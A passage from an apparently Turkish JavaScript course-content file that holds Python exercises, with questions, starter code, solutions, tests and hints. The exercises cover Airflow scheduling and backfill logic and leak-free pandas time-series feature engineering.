        q: '<p><code>dilimler(baslangic, bitis, adim_saat=24)</code> yaz: <code>baslangic</code> ve <code>bitis</code> <code>"YYYY-MM-DD HH:MM"</code> metinleri. <code>baslangic</code>\'ten başlayarak <code>adim_saat</code> uzunluğunda <b>yarı açık</b> dilimler üret; dilimin sonu <code>bitis</code>\'i aşmıyorsa listeye ekle. Her dilimi <code>("YYYY-MM-DD HH:MM", "YYYY-MM-DD HH:MM")</code> demeti olarak döndür.</p>',
        guide: [
          'İki metni datetime.strptime(m, "%Y-%m-%d %H:%M") ile çevir.',
          'adim = timedelta(hours=adim_saat).',
          'while bas + adim <= bit: dilimi ekle, bas\'ı adım kadar ilerlet.',
          'Demetleri strftime ile aynı biçime geri çevir.'
        ],
        example: 'from datetime import datetime, timedelta\nt = datetime.strptime("2024-10-01 06:00", "%Y-%m-%d %H:%M")\nprint((t + timedelta(hours=6)).strftime("%Y-%m-%d %H:%M"))\n',
        start: 'from datetime import datetime, timedelta\n\nBICIM = "%Y-%m-%d %H:%M"\n\ndef dilimler(baslangic, bitis, adim_saat=24):\n    sonuc = []\n    # TODO: metinleri datetime\'a çevir, adımı hesapla\n    # TODO: dilim sonu bitişi aşmadıkça ekle\n    return sonuc\n',
        sol: 'from datetime import datetime, timedelta\n\nBICIM = "%Y-%m-%d %H:%M"\n\ndef dilimler(baslangic, bitis, adim_saat=24):\n    bas = datetime.strptime(baslangic, BICIM)\n    bit = datetime.strptime(bitis, BICIM)\n    adim = timedelta(hours=adim_saat)\n    sonuc = []\n    while bas + adim <= bit:\n        sonuc.append((bas.strftime(BICIM), (bas + adim).strftime(BICIM)))\n        bas += adim\n    return sonuc\n',
        tests: 'assert dilimler("2024-10-01 00:00", "2024-10-03 00:00") == [("2024-10-01 00:00", "2024-10-02 00:00"), ("2024-10-02 00:00", "2024-10-03 00:00")], "İki tam gün"\nassert dilimler("2024-10-01 00:00", "2024-10-02 12:00") == [("2024-10-01 00:00", "2024-10-02 00:00")], "Yarım kalan dilim işlenmez"\nassert len(dilimler("2024-10-01 00:00", "2024-10-02 00:00", adim_saat=6)) == 4, "Günde 4 adet 6 saatlik dilim"\nassert dilimler("2024-10-31 22:00", "2024-11-01 01:00", adim_saat=1)[-1] == ("2024-11-01 00:00", "2024-11-01 01:00"), "Ay geçişi doğru olmalı"\nassert dilimler("2024-10-01 00:00", "2024-10-01 00:00") == [], "Boş aralık"\n',
        hints: [
          'Tarih aritmetiğini metinle değil datetime + timedelta ile yap; ay ve yıl geçişleri kendiliğinden çözülür.',
          'Koşul bas + adim <= bit: dilimin SONU bitişi geçmemeli.',
          'sonuc.append((bas.strftime(BICIM), (bas + adim).strftime(BICIM)))'
        ],
        why: 'Airflow\'un zamanlayıcısı ve backfill komutu bu hesabı yapar: tamamlanmamış dilim çalıştırılmaz. Saatlik ve günlük DAG\'larda aynı mantık; yalnız adım değişir.'
      },
      {
        t: 'code',
        id: 'orkestrasyon-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Zamanlayıcının catchup davranışını yaz: <code>olusturulacak(start_date, simdi, catchup, son_calisan=None)</code> günlük bir DAG için oluşturulacak çalışmaların <code>ds</code> değerlerini (<code>date</code> listesi) döndürsün. Kurallar: Bir dilim, sonu (<code>ds + 1 gün</code>, gece yarısı) <code>simdi</code>\'den küçük ya da eşitse tamamlanmıştır. <code>son_calisan</code> verilirse ondan sonraki günlerden başla, verilmezse <code>start_date</code>\'ten. <code>catchup=True</code> ise tamamlanmış ve henüz çalışmamış tüm dilimler; <code>catchup=False</code> ise yalnız en sonuncusu (hiç yoksa boş liste).</p>',
        start: 'from datetime import date, datetime, timedelta\n\ndef olusturulacak(start_date, simdi, catchup, son_calisan=None):\n    pass\n',
        sol: 'from datetime import date, datetime, timedelta\n\ndef olusturulacak(start_date, simdi, catchup, son_calisan=None):\n    ds = son_calisan + timedelta(days=1) if son_calisan else start_date\n    tamam = []\n    while datetime.combine(ds + timedelta(days=1), datetime.min.time()) <= simdi:\n        tamam.append(ds)\n        ds += timedelta(days=1)\n    if catchup:\n        return tamam\n    return tamam[-1:]\n',
        tests: 'S = datetime(2024, 10, 5, 3, 0)\nassert olusturulacak(date(2024, 10, 1), S, True) == [date(2024, 10, d) for d in (1, 2, 3, 4)], "5 Ekim 03:00\'te 1-4 Ekim dilimleri tamamlanmış"\nassert olusturulacak(date(2024, 10, 1), S, False) == [date(2024, 10, 4)], "catchup=False yalnız en son tamamlanan dilim"\nassert olusturulacak(date(2024, 10, 1), S, True, son_calisan=date(2024, 10, 2)) == [date(2024, 10, 3), date(2024, 10, 4)], "Son çalışandan sonrası"\nassert olusturulacak(date(2024, 10, 5), S, True) == [], "5 Ekim dilimi henüz bitmedi"\nassert olusturulacak(date(2024, 10, 4), datetime(2024, 10, 5, 0, 0), True) == [date(2024, 10, 4)], "Dilim sonu tam gece yarısında tamamlanmış sayılır"\n',
        hints: [
          'Başlangıç günü: son_calisan varsa ertesi gün, yoksa start_date.',
          'Dilim sonunu datetime.combine(ds + 1 gün, saat 00:00) ile hesaplayıp simdi ile karşılaştır.',
          'catchup False ise listenin son elemanı: tamam[-1:] (boşsa boş döner).'
        ],
        why: 'catchup=False olsa bile Airflow en son tamamlanan dilimi çalıştırır; geçmişin kalanını atlar. Bir DAG\'ı haftalarca durdurup açtığında catchup=True ise birikmiş tüm günler çalışır; bu davranışı önceden hesaplayabilmek sürprizleri önler.'
      },
      {
        t: 'code',
        id: 'orkestrasyon-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Veri farkındalıklı zamanlama: <code>tetiklenenler(dagler, olaylar)</code> yaz. <code>dagler</code> sözlüğü DAG adını beklediği varlık (asset) kümesine eşler. <code>olaylar</code>, sırayla güncellenen varlık adlarının listesidir. Bir DAG, son tetiklenmesinden beri beklediği <b>tüm</b> varlıklar en az bir kez güncellenince tetiklenir ve sayacı sıfırlanır. Tetiklenmeleri oluş sırasıyla <code>(olay_indeksi, dag_adi)</code> listesi olarak döndür; aynı olayda birden çok DAG tetiklenirse DAG adına göre alfabetik sırala.</p>',
        start: 'def tetiklenenler(dagler, olaylar):\n    pass\n',
        sol: 'def tetiklenenler(dagler, olaylar):\n    gorulen = {d: set() for d in dagler}\n    sonuc = []\n    for i, varlik in enumerate(olaylar):\n        for d in sorted(dagler):\n            if varlik in dagler[d]:\n                gorulen[d].add(varlik)\n                if gorulen[d] == dagler[d]:\n                    sonuc.append((i, d))\n                    gorulen[d] = set()\n    return sonuc\n',
        tests: 'D = {"kurye_performans": {"siparisler", "kuryeler"}, "gunluk_ozet": {"siparisler"}}\nO = ["siparisler", "siparisler", "kuryeler", "kuryeler", "siparisler"]\nassert tetiklenenler(D, O) == [(0, "gunluk_ozet"), (1, "gunluk_ozet"), (2, "kurye_performans"), (4, "gunluk_ozet"), (4, "kurye_performans")], f"Gelen: {tetiklenenler(D, O)}"\nassert tetiklenenler(D, ["kuryeler", "kuryeler"]) == [], "siparisler güncellenmeden kurye_performans tetiklenmez"\nassert tetiklenenler({}, O) == [], "DAG yoksa tetikleme yok"\n',
        hints: ['Her DAG için "son tetiklenmeden beri görülen varlıklar" kümesi tut.', 'Görülen küme beklenen kümeye eşit olunca tetikle ve kümeyi sıfırla.', 'Aynı olayda alfabetik sıra için DAG\'ları sorted(dagler) ile gez.'],
        why: 'Airflow\'da schedule=[A, B] "ikisi de güncellenince" demektir; A iki kez güncellense de B gelene kadar beklenir ve tek çalışma oluşur. Bu, üretici geciktiğinde tüketicinin yarım veriyle çalışmasını engeller.'
      },
      {
        t: 'code',
        id: 'orkestrasyon-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['sqlite3'],
        q: '<p>Hatayı bul ve düzelt. <code>gunluk_say(conn, ds)</code> bir Airflow görevinin içidir: <code>ds</code> (<code>"YYYY-MM-DD"</code>) gününün <code>lk_orders</code> siparişlerini saymalı. Backfill sonrası günlük sayıların toplamı aralıktaki toplam siparişi tutmuyor; hatta her gün 0 çıkıyor.</p>',
        start: 'from datetime import date, timedelta\n\ndef gunluk_say(conn, ds):\n    return conn.execute(\n        "SELECT COUNT(*) FROM lk_orders WHERE placed_at BETWEEN ? AND ?", (ds, ds)\n    ).fetchone()[0]\n',
        sol: 'from datetime import date, timedelta\n\ndef gunluk_say(conn, ds):\n    ertesi = (date.fromisoformat(ds) + timedelta(days=1)).isoformat()\n    return conn.execute(\n        "SELECT COUNT(*) FROM lk_orders WHERE placed_at >= ? AND placed_at < ?", (ds, ertesi)\n    ).fetchone()[0]\n',
        tests: 'import veri\nc = veri.baglan("lezzet_kurye", tablolar=["lk_orders"])\ngunler = [(date(2024, 10, 1) + timedelta(days=i)).isoformat() for i in range(7)]\nsayilar = [gunluk_say(c, g) for g in gunler]\nassert sayilar == [62, 53, 51, 49, 86, 69, 62], f"1-7 Ekim günlük sipariş sayıları yanlış: {sayilar}"\ntoplam = c.execute("SELECT COUNT(*) FROM lk_orders WHERE placed_at >= \'2024-10-01\' AND placed_at < \'2024-10-08\'").fetchone()[0]\nassert sum(sayilar) == toplam, "Günlük toplamlar haftalık toplamı tutmalı (yarı açık dilimler örtüşmez, boşluk bırakmaz)"\n',
        hints: ['placed_at "2024-10-01 11:07:01" biçiminde; "2024-10-01" ile BETWEEN neyi yakalar?', 'Dilimi [ds, ds + 1 gün) olarak tanımla.', 'ertesi = (date.fromisoformat(ds) + timedelta(days=1)).isoformat()'],
        why: 'Tarih-saat sütununu yalnız tarihle BETWEEN\'e sokmak günün tüm saatlerini dışarıda bırakır; iki ucu dahil eden aralık ise gece yarısı kayıtlarını iki güne yazar. Yarı açık aralık hem eksiksiz hem örtüşmesizdir; backfill toplamlarının tutması bunun kanıtıdır.'
      },
      {
        t: 'code',
        id: 'orkestrasyon-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Backfill yürütücüsünü simüle et: <code>backfill(gunler, max_active_runs, depends_on_past, basarisiz)</code>. <code>gunler</code> sıralı tarih metinleri, <code>basarisiz</code> çalışınca hata verecek günlerin kümesi. Çalışmalar <b>dalgalar</b> hâlinde yürür: her dalgada sıradaki en fazla <code>max_active_runs</code> gün aynı anda çalışır. <code>depends_on_past=True</code> ise bir gün, önceki günü başarılı olmadan çalışamaz: dalga yalnız bir gün içerir ve bir başarısızlıktan sonra kalan tüm günler çalışmaz. <code>False</code> ise başarısızlık diğerlerini engellemez. <code>(dalgalar, basarili, calismayan)</code> döndür: dalgalar liste listesi, diğer ikisi sıralı liste.</p>',
        start: 'def backfill(gunler, max_active_runs, depends_on_past, basarisiz):\n    return [], [], []\n',
        sol: 'def backfill(gunler, max_active_runs, depends_on_past, basarisiz):\n    boyut = 1 if depends_on_past else max_active_runs\n    dalgalar, basarili, calismayan = [], [], []\n    i = 0\n    while i < len(gunler):\n        dalga = gunler[i:i + boyut]\n        dalgalar.append(dalga)\n        i += boyut\n        hata = False\n        for g in dalga:\n            if g in basarisiz:\n                hata = True\n            else:\n                basarili.append(g)\n        if hata and depends_on_past:\n            calismayan = gunler[i:]\n            break\n    return dalgalar, sorted(basarili), sorted(calismayan)\n',
        tests: 'G = ["10-01", "10-02", "10-03", "10-04", "10-05"]\nd, b, c = backfill(G, 2, False, {"10-03"})\nassert d == [["10-01", "10-02"], ["10-03", "10-04"], ["10-05"]], f"İkişerli dalgalar: {d}"\nassert b == ["10-01", "10-02", "10-04", "10-05"] and c == [], "depends_on_past=False: hata diğerlerini engellemez"\nd, b, c = backfill(G, 3, True, {"10-03"})\nassert d == [["10-01"], ["10-02"], ["10-03"]], f"depends_on_past: tek tek ve hata sonrası durur: {d}"\nassert b == ["10-01", "10-02"] and c == ["10-04", "10-05"], "Hatadan sonraki günler çalışmaz"\nassert backfill(G, 10, False, set())[0] == [G], "Sınır geniş ise tek dalga"\nassert backfill([], 2, True, set()) == ([], [], []), "Boş aralık"\n',
        hints: ['Dalga boyutu: depends_on_past ise 1, değilse max_active_runs.', 'Listeyi gunler[i:i + boyut] dilimleriyle yürü.', 'depends_on_past ve hata varsa kalan gunler[i:] çalışmayanlardır; döngüden çık.'],
        why: 'max_active_runs kaynakları korur, depends_on_past ise kümülatif tabloların tutarlılığını. İkincisi açıkken bir günün hatası tüm backfill\'i durdurur; bu yüzden ya hatayı düzeltip o günden devam edersin ya da görevi bağımsız (idempotent ve kümülatif olmayan) tasarlarsın.'
      }
    ],
    faq: [
      {
        q: 'Airflow 2 ile Airflow 3 arasında bu konularda ne değişti?',
        a: 'Airflow 3\'te Dataset adı Asset oldu, DAG ve görev API\'si airflow.sdk altına taşındı, backfill zamanlayıcı tarafından yönetilen bir nesne hâline geldi (airflow backfill create) ve logical_date bazı çalışmalarda boş olabilir. Kavramlar (data interval, catchup, idempotentlik) aynı kaldı; kodu taşırken resmi yükseltme kılavuzunu ve ruff\'ın AIR kurallarını kullan.'
      },
      {
        q: 'Saat dilimini nasıl yönetmeliyim?',
        a: 'start_date\'i her zaman saat dilimli ver (pendulum.datetime(2024, 10, 1, tz="Europe/Istanbul")) ya da her şeyi UTC tut. Saat dilimsiz start_date, sunucunun varsayılanına göre yorumlanır ve "gün" sınırları raporla uyuşmaz.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'pandas-zaman-serisi' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'pandas-zaman-serisi',
    min: 25,
    needs: ['pandas'],
    html: `<p>Bu derste zamanı ölçmeyi, kovalara bölmeyi ve dönemleri kıyaslamayı öğrendin. Bir sonraki doğal soru "yarın kaç?" sorusudur, yani tahmin (forecasting). Tahmin modelleri, ARIMA ve üstel düzeltme <b>Zaman serisi tahmini</b> dersinin konusu; bu bölüm o derse köprü kuruyor: geçmişten özellik (feature) üretmek, bunu <b>sızıntısız</b> yapmak ve modeli dürüstçe sınamak. Veri, Pedal İzmir'in Haziran-Ağustos 2024 arasındaki 116 bin bisiklet yolculuğu.</p>
<h2>Önce seriyi kur: günlük yolculuk sayısı</h2>
<pre class="py">import veri
import pandas as pd
yol = veri.oku("pedal_izmir", "bk_trips")
zaman = pd.to_datetime(yol["started_at"])
gunluk = zaman.dt.floor("D").value_counts().sort_index().asfreq("D", fill_value=0)
gunluk.name = "yolculuk"
print(len(gunluk), gunluk.index.min().date(), gunluk.index.max().date())
print(gunluk.head(7).tolist())
print(gunluk.groupby(gunluk.index.dayofweek).mean().round(0).tolist())   # Pzt..Paz</pre>
<p><code>asfreq("D", fill_value=0)</code> hiç yolculuk olmayan günleri de 0 olarak ekler; eksik gün, gecikme (lag) hesabını sessizce kaydırır. Haftanın günü ortalamaları mevsimselliği (seasonality) gösterir: modelin bunu öğrenmesi için ona "geçen haftanın aynı günü" bilgisini vermen gerekir.</p>
<h2>Gecikme ve pencere özellikleri</h2>
<p>Klasik makine öğrenmesi modelleri (doğrusal regresyon, gradyan artırma) sırayı bilmez; her satırı bağımsız görür. Zaman bilgisini ona sütun olarak verirsin:</p>
<div class="tbl-wrap"><table><tr><th>Özellik</th><th>pandas</th><th>Anlamı</th></tr>
<tr><td>lag_1</td><td><code>s.shift(1)</code></td><td>Dünkü değer</td></tr>
<tr><td>lag_7</td><td><code>s.shift(7)</code></td><td>Geçen haftanın aynı günü</td></tr>
<tr><td>ort_7</td><td><code>s.shift(1).rolling(7).mean()</code></td><td>Dünden geriye son 7 günün ortalaması</td></tr>
<tr><td>haftanin_gunu</td><td><code>s.index.dayofweek</code></td><td>Takvimden gelir; gelecek için de bilinir</td></tr></table></div>
<div class="warn"><b>Sızıntının en sinsi biçimi: shift'siz rolling</b><code>s.rolling(7).mean()</code> bugünün değerini de içerir. Tahmin anında bugünün değeri henüz bilinmediği için model eğitimde "cevabı görür", testte harika, canlıda kötü sonuç verir. Kural: tahmin edilen an t ise, özellik yalnız t'den <b>önce</b> bilinen bilgiyle hesaplanmalı. Pencereyi her zaman <code>shift(1)</code>'den sonra uygula.</div>
<pre class="py">X = pd.DataFrame({
    "y": gunluk,
    "lag_1": gunluk.shift(1),
    "lag_7": gunluk.shift(7),
    "ort_7": gunluk.shift(1).rolling(7).mean(),
    "sizan_ort_7": gunluk.rolling(7).mean(),          # YANLIŞ: bugünü içerir
    "haftanin_gunu": gunluk.index.dayofweek,
}).dropna()
print(len(X))
print(X[["y", "ort_7", "sizan_ort_7"]].corr().round(3).loc["y"].tolist())</pre>
<p>Sızan özelliğin hedefle korelasyonu belirgin biçimde yüksek çıkar; bu fark "çok iyi" görünen ama canlıda çöken modelin işaretidir. Çok adımlı tahminde (7 gün sonrası) kural daha da sıkıdır: ufuk h ise en yakın gecikme <code>shift(h)</code> olabilir.</p>
<p>Dış değişkenlerde (exogenous) aynı soruyu sor: "Tahmin anında bunu gerçekten bilir miyim?" Pedal İzmir'in <code>bk_weather</code> tablosundaki gerçekleşen yağmur, yarının yolculuğunu tahmin ederken bilinmez; canlıda elinde yalnız hava <b>tahmini</b> olur. Eğitimde gerçekleşen değeri kullanmak modeli olduğundan iyi gösterir. Takvim bilgileri (tatil, okul dönemi, kampanya planı) ise önceden bilinir ve güvenle kullanılır.</p>
<h2>Dürüst sınama: zamana göre bölme</h2>
<p>Rastgele <code>train_test_split</code> zaman serisinde yasaktır: test günleri eğitim günlerinin arasına serpiştirilir ve model geleceği görür. Doğrusu son N günü test olarak ayırmak ya da ileri yürüyen doğrulama (walk-forward) yapmaktır: önce 1-60. günlerle eğit, 61-67'yi tahmin et; sonra 1-67 ile eğit, 68-74'ü tahmin et... scikit-learn'de bunu <code>TimeSeriesSplit</code> yapar.</p>
<pre class="py">from sklearn.model_selection import TimeSeriesSplit
for i, (egitim, test) in enumerate(TimeSeriesSplit(n_splits=3, test_size=7).split(X)):
    print(i, "eğitim:", X.index[egitim[0]].date(), "→", X.index[egitim[-1]].date(),
          "| test:", X.index[test[0]].date(), "→", X.index[test[-1]].date())</pre>
<h2>Kıyas modelleri: önce basit olanı yen</h2>
<p>Her tahmin modelinin geçmesi gereken iki çıta vardır: <b>naive</b> (yarın = bugün) ve <b>mevsimsel naive</b> (yarın = geçen haftanın aynı günü). Modelin ortalama mutlak hatası (MAE) bunlardan iyi değilse karmaşıklık boşunadır.</p>
<pre class="py">test = gunluk.iloc[-14:]
naive = gunluk.shift(1).iloc[-14:]
mevsimsel = gunluk.shift(7).iloc[-14:]
print("naive MAE:", round((test - naive).abs().mean(), 1))
print("mevsimsel naive MAE:", round((test - mevsimsel).abs().mean(), 1))</pre>
<p>Bu veride naive daha iyi çıkıyor; yani yolculuk sayısı haftalık örüntüden çok son günlerin düzeyine bağlı. Böyle bir bulgu, model kurmadan önce hangi özelliklerin önemli olacağını söyler. <b>Zaman serisi tahmini</b> dersinde bu kıyasları ExponentialSmoothing, SARIMA ve gecikme özellikli gradyan artırma modelleriyle aşmaya çalışacaksın.</p>
<div class="note"><b>Gerçek işte</b>Talep tahmini (kaç bisiklet, kaç kurye, kaç kasiyer) operasyon ekiplerinin her gün kullandığı bir çıktıdır. Veri bilimi mülakatlarında "modelin testte çok iyi ama canlıda kötü, ne olabilir?" sorusunun ilk cevabı neredeyse her zaman zaman sızıntısıdır.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'pandas-zaman-serisi-y1',
        stage: 'Isınma',
        q: 'Yarının satışını tahmin eden bir model için hangi özellik <b>sızıntı</b> içerir?',
        o: ['<code>s.shift(1)</code>', '<code>s.shift(7)</code>', '<code>s.rolling(7).mean()</code>', '<code>s.index.dayofweek</code>'],
        a: 2,
        why: 'rolling(7).mean() o günün değerini de pencereye katar; tahmin anında bu değer bilinmez. shift(1).rolling(7).mean() doğrusudur. Haftanın günü ise takvimden gelir ve gelecek için de bilinir, sızıntı değildir.'
      },
      {
        t: 'mc',
        id: 'pandas-zaman-serisi-y2',
        stage: 'Isınma',
        q: '92 günlük seride bir modeli sınamak için en doğru bölme hangisi?',
        o: ['train_test_split(X, y, test_size=0.2, shuffle=True)', 'Son 14 günü test, öncesini eğitim olarak ayırmak', 'Hafta sonlarını test, hafta içlerini eğitim yapmak', 'Her ayın ilk haftasını test olarak ayırmak'],
        a: 1,
        why: 'Model gerçekte hep geçmişle eğitilip gelecekte kullanılır; sınama da bunu taklit etmeli. Karıştırarak bölmek ya da aralara serpiştirilmiş test günleri, modelin bir test gününün hem öncesini hem sonrasını görmesine yol açar.'
      },
      {
        t: 'predict',
        id: 'pandas-zaman-serisi-y3',
        stage: 'Kodu oku',
        needs: ['pandas'],
        q: 'Bu kod ne yazdırır?',
        o: ['[nan, nan, 15.0, 25.0, 35.0]', '[nan, 15.0, 25.0, 35.0, 45.0]', '[15.0, 25.0, 35.0, 45.0, nan]', '[nan, nan, 20.0, 30.0, 40.0]'],
        a: 0,
        code: 'import pandas as pd\ns = pd.Series([10, 20, 30, 40, 50])\nprint(s.shift(1).rolling(2).mean().tolist())\n',
        why: 'shift(1) seriyi [nan, 10, 20, 30, 40] yapar. 2\'lik pencere ilk tam pencereyi 3. elemanda bulur: (10+20)/2 = 15. Böylece 30 değerinin satırında yalnız ondan önceki iki değerin ortalaması durur: sızıntı yok.'
      },
      {
        t: 'order',
        id: 'pandas-zaman-serisi-y4',
        stage: 'Kodu oku',
        needs: ['pandas'],
        q: '<p>Gecikme özelliklerini üretip son 3 günü test olarak ayıran programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">4 3</pre>',
        lines: [
          'import pandas as pd',
          's = pd.Series(range(10), index=pd.date_range("2024-06-01", periods=10, freq="D"))',
          'X = pd.DataFrame({"y": s, "lag_1": s.shift(1), "lag_3": s.shift(3)})',
          'X = X.dropna()',
          'egitim, test = X.iloc[:-3], X.iloc[-3:]',
          'print(len(egitim), len(test))'
        ],
        expect: '4 3\n',
        hint: 'dropna, bölmeden önce yapılmalı; yoksa eğitim kümesinde NaN kalır.',
        why: 'lag_3 ilk üç satırı NaN yapar; dropna sonrası 7 satır kalır. Son 3 gün test, ilk 4 gün eğitim olur. Bölme her zaman sıralı ve iloc ile yapılır.'
      },
      {
        t: 'code',
        id: 'pandas-zaman-serisi-y5',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Pedal İzmir için sızıntısız özellik tablosu kur. <code>ozellikler(s)</code> yaz: günlük yolculuk serisi <code>s</code> (DatetimeIndex) alsın ve şu sütunlarla, NaN içeren satırları atılmış bir DataFrame döndürsün: <code>y</code> (seri), <code>lag_1</code>, <code>lag_7</code>, <code>ort_7</code> (dünden geriye 7 günün ortalaması), <code>haftanin_gunu</code> (0 = Pazartesi). Testler gerçek veriyle çalışır.</p>',
        guide: [
          'DataFrame\'i sözlükle kur: her sütun s üzerinde bir dönüşüm.',
          'Gecikmeler için shift(1) ve shift(7).',
          'Pencere için önce shift(1), sonra rolling(7).mean().',
          'haftanin_gunu = s.index.dayofweek; en sonda dropna().'
        ],
        example: 'import pandas as pd\nsatis = pd.Series([5, 7, 6, 9], index=pd.date_range("2024-01-01", periods=4))\nprint(pd.DataFrame({"y": satis, "dun": satis.shift(1), "ay": satis.index.month}).dropna())\n',
        start: 'import veri\nimport pandas as pd\n\ndef gunluk_seri():\n    z = pd.to_datetime(veri.oku("pedal_izmir", "bk_trips")["started_at"])\n    return z.dt.floor("D").value_counts().sort_index().asfreq("D", fill_value=0)\n\ndef ozellikler(s):\n    X = pd.DataFrame({\n        "y": s,\n        # TODO: lag_1, lag_7\n        # TODO: ort_7 (sızıntısız)\n        # TODO: haftanin_gunu\n    })\n    return X\n',
        sol: 'import veri\nimport pandas as pd\n\ndef gunluk_seri():\n    z = pd.to_datetime(veri.oku("pedal_izmir", "bk_trips")["started_at"])\n    return z.dt.floor("D").value_counts().sort_index().asfreq("D", fill_value=0)\n\ndef ozellikler(s):\n    X = pd.DataFrame({\n        "y": s,\n        "lag_1": s.shift(1),\n        "lag_7": s.shift(7),\n        "ort_7": s.shift(1).rolling(7).mean(),\n        "haftanin_gunu": s.index.dayofweek,\n    })\n    return X.dropna()\n',
        tests: 's = gunluk_seri()\nX = ozellikler(s)\nassert list(X.columns) == ["y", "lag_1", "lag_7", "ort_7", "haftanin_gunu"], f"Sütunlar: {list(X.columns)}"\nassert len(X) == 85, f"92 gün - 7 (lag_7 ve ort_7 için) = 85 satır, gelen {len(X)}"\nson = X.loc["2024-08-31"]\nassert son["y"] == 1388 and son["lag_1"] == 1399 and son["lag_7"] == 1341, "31 Ağustos: y=1388, dün 1399, geçen hafta 1341"\nassert round(son["ort_7"], 2) == 1312.71, f"ort_7 o günü İÇERMEMELİ: 24-30 Ağustos ortalaması 1312.71, gelen {son[\'ort_7\']:.2f}"\nassert son["haftanin_gunu"] == 5, "31 Ağustos 2024 Cumartesi (5)"\n',
        hints: ['Her özellik "o güne kadar bilinen" bilgiyle hesaplanmalı.', 'ort_7 = s.shift(1).rolling(7).mean(); sıralama önemli.', 'İlk 7 satırda lag_7 ve ort_7 NaN olur; dropna ile at.'],
        why: 'Bu tablo bir regresyon ya da gradyan artırma modelinin girdisidir. ort_7 testindeki değer, bugünü içeren hatalı pencereden farklıdır; sızıntıyı test ile yakalamanın yolu tam olarak budur: bilinen bir gün için özelliği elle hesaplayıp karşılaştırmak.'
      },
      {
        t: 'code',
        id: 'pandas-zaman-serisi-y6',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Kıyas modellerinin hatasını hesapla: <code>kiyas_mae(s, test_gun=14)</code> yaz. Serinin son <code>test_gun</code> gününü test kabul et; her test günü için naive tahmin (önceki gün) ve mevsimsel naive tahmin (7 gün önce) yap. <code>{"naive": mae1, "mevsimsel": mae2}</code> döndür (1 ondalık). Gerçek Pedal İzmir serisinde dene.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef gunluk_seri():\n    z = pd.to_datetime(veri.oku("pedal_izmir", "bk_trips")["started_at"])\n    return z.dt.floor("D").value_counts().sort_index().asfreq("D", fill_value=0)\n\ndef kiyas_mae(s, test_gun=14):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef gunluk_seri():\n    z = pd.to_datetime(veri.oku("pedal_izmir", "bk_trips")["started_at"])\n    return z.dt.floor("D").value_counts().sort_index().asfreq("D", fill_value=0)\n\ndef kiyas_mae(s, test_gun=14):\n    test = s.iloc[-test_gun:]\n    naive = s.shift(1).iloc[-test_gun:]\n    mevsimsel = s.shift(7).iloc[-test_gun:]\n    return {"naive": round(float((test - naive).abs().mean()), 1),\n            "mevsimsel": round(float((test - mevsimsel).abs().mean()), 1)}\n',
        tests: 's = gunluk_seri()\nr = kiyas_mae(s)\nassert r == {"naive": 96.6, "mevsimsel": 107.8}, f"Son 14 gün: naive 96.6, mevsimsel 107.8 beklenir, gelen {r}"\nk = pd.Series([10, 20, 10, 20, 10, 20, 10, 20, 10], index=pd.date_range("2024-01-01", periods=9))\nassert kiyas_mae(k, test_gun=2) == {"naive": 10.0, "mevsimsel": 10.0}, "Küçük seri kontrolü"\n',
        hints: ['Tahminleri shift ile üret, sonra son test_gun satırı al.', 'MAE = (gerçek - tahmin).abs().mean().', 'Sonucu float\'a çevirip round(..., 1) uygula.'],
        why: 'Kıyas modelleri tahmin projesinin ilk adımıdır: kurduğun her model bu iki sayıyı geçmek zorunda. Bu veride naive\'in kazanması, düzey değişimlerinin haftalık örüntüden daha belirleyici olduğunu söyler.'
      },
      {
        t: 'code',
        id: 'pandas-zaman-serisi-y7',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Hatayı bul ve düzelt. <code>hazirla(s, test_gun)</code> özellik tablosunu kurup eğitim ve test kümesine bölmeli. Modelin testteki başarısı şüphe uyandıracak kadar yüksek: hem özelliklerde hem bölmede zaman sızıntısı var. <code>ort_3</code> dünden geriye 3 günün ortalaması olmalı; bölme son <code>test_gun</code> günü test yapmalı. Fonksiyon <code>(egitim, test)</code> DataFrame\'leri döndürür.</p>',
        start: 'import pandas as pd\n\ndef hazirla(s, test_gun):\n    X = pd.DataFrame({"y": s, "lag_1": s.shift(1), "ort_3": s.rolling(3).mean()}).dropna()\n    test = X.sample(n=test_gun, random_state=0)\n    egitim = X.drop(test.index)\n    return egitim, test\n',
        sol: 'import pandas as pd\n\ndef hazirla(s, test_gun):\n    X = pd.DataFrame({"y": s, "lag_1": s.shift(1), "ort_3": s.shift(1).rolling(3).mean()}).dropna()\n    egitim, test = X.iloc[:-test_gun], X.iloc[-test_gun:]\n    return egitim, test\n',
        tests: 's = pd.Series([10, 12, 14, 13, 15, 18, 20, 19, 22, 25], index=pd.date_range("2024-06-01", periods=10))\ne, t = hazirla(s, 3)\nassert t.index.min() > e.index.max(), "Tüm test günleri eğitim günlerinden SONRA olmalı"\nassert list(t.index.day) == [8, 9, 10], f"Test son 3 gün olmalı: {list(t.index.day)}"\nassert t.loc["2024-06-10", "ort_3"] == (20 + 19 + 22) / 3, "10 Haziran ort_3: 7-9 Haziran ortalaması (o gün hariç)"\nassert len(e) == 4, f"shift(1)+rolling(3) ilk 3 satırı atar: 7 satırdan 3\'ü test, 4 eğitim; gelen {len(e)}"\n',
        hints: ['İki hata var: biri ort_3\'te, biri bölmede.', 'Pencereden önce shift(1) uygula.', 'Rastgele örnek yerine iloc[:-n] ve iloc[-n:] kullan.'],
        why: 'Rastgele örneklenen test günleri, komşu günlerin eğitimde olması yüzünden kolay tahmin edilir; bugünü içeren pencere ise cevabı doğrudan verir. İkisi birlikte canlıda hiç görülmeyecek bir başarı üretir.'
      },
      {
        t: 'code',
        id: 'pandas-zaman-serisi-y8',
        stage: 'Meydan okuma',
        diff: 3,
